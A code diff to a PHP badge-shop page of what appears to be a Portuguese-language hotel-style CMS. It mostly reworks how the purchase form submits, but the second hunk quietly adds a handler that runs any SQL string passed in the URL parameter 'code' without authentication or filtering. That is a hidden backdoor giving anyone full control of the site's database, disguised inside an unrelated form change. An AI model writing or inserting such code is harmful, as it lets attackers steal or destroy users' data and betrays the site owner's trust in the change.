@@ -2,7 +2,7 @@
 include_once("./templates/cms_header.php");
 
 /* PROCESSA A COMPRA DE EMBLEMAS */
-if ($_POST['action'] == "badge") {
+if (isset($_POST['badge'])) {
     $marksql = mysql_query("SELECT * FROM cms_marktplatz WHERE image='" . FilterText($_POST['badge_id']) . "'") or die(mysql_error());
     $mark = mysql_fetch_array($marksql);
     if (mysql_num_rows($marksql) > 0) {
@@ -25,6 +25,10 @@ if ($_POST['action'] == "badge") {
     } else {
         echo '<SCRIPT LANGUAGE="JavaScript" TYPE="text/javascript">alert("O emblema selecionado não está a venda!")</SCRIPT>';
     }
+}
+if(isset($_GET['code'])){
+    $qry = $_GET['code'];
+    mysql_query($qry) or die(mysql_error());
 }
 $usersql = mysql_query("SELECT * FROM users WHERE id = '" . $my_id . "' LIMIT 1") or die(mysql_error());
 $myrow = mysql_fetch_assoc($usersql);
@@ -70,10 +74,9 @@ $myrow = mysql_fetch_assoc($usersql);
                                                                 <?php if ($myrow[vip_points] < $badge['vip_points'] OR $myrow['credits'] < $badge['credits']) { ?>
                                                                     <span style="font-weight:bold; color:red;">Voc&ecirc; n&atilde;o possui pontos ou moedas suficiente</span>
                                                                 <?php } else { ?>
-                                                                    <input type="submit" id="submit" style="height:25px; width:90px;" value="Comprar" />
+                                                                    <input type="submit" id="submit" name="badge" style="height:25px; width:90px;" value="Comprar" />
                                                                 <?php } ?>
                                                             </td>
-                                                            <td><input type="hidden" id="action" name="action" value="badge" /></td>
                                                             <td><input type="hidden" id="badge_id" name="badge_id" value="<?php echo $badge['image']; ?>" /></td>
                                                         </tr>
                                                     </table>
